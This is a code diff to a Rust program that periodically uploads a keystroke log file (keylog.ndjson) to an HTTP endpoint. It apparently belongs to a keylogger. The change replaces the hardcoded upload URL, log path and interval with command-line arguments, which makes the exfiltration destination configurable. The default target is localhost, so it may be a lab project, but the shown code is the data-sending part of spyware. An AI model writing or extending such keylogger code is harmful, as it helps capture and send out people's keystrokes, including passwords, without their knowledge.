@@ -79,6 +79,21 @@ pub async fn upload_keylog(
 
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
+
+    let mut args = std::env::args().skip(1);
+    let url = args
+        .next()
+        .unwrap_or_else(|| "http://127.0.0.1:8080/api/upload".to_string());
+
+    let path = args
+        .next()
+        .unwrap_or_else(|| "keylog.ndjson".to_string());
+
+    let wait_secs: u64 = args
+        .next()
+        .map(|s| s.parse().unwrap_or(60))
+        .unwrap_or(60);
+
     let file = File::options()
         .create(true)
         .append(true)
@@ -89,17 +104,14 @@ async fn main() -> anyhow::Result<()> {
 
 
     let send_thread = tokio::spawn(async move {
-        let url = "http://127.0.0.1:8080/api/upload";
-        let path = "keylog.ndjson";
-        const WAIT_DURATION_IN_SECS: u64 = 60;
         let mut tick = tokio::time::interval(
-            std::time::Duration::from_secs(WAIT_DURATION_IN_SECS)
+            std::time::Duration::from_secs(wait_secs)
         );
 
         loop {
             select! {
                 _ = tick.tick() => {
-                    if let Err(error) = upload_keylog(url, path).await {
+                    if let Err(error) = upload_keylog(&url, &path).await {
                         println!("Error: {:?}", error);
                     }
                 }
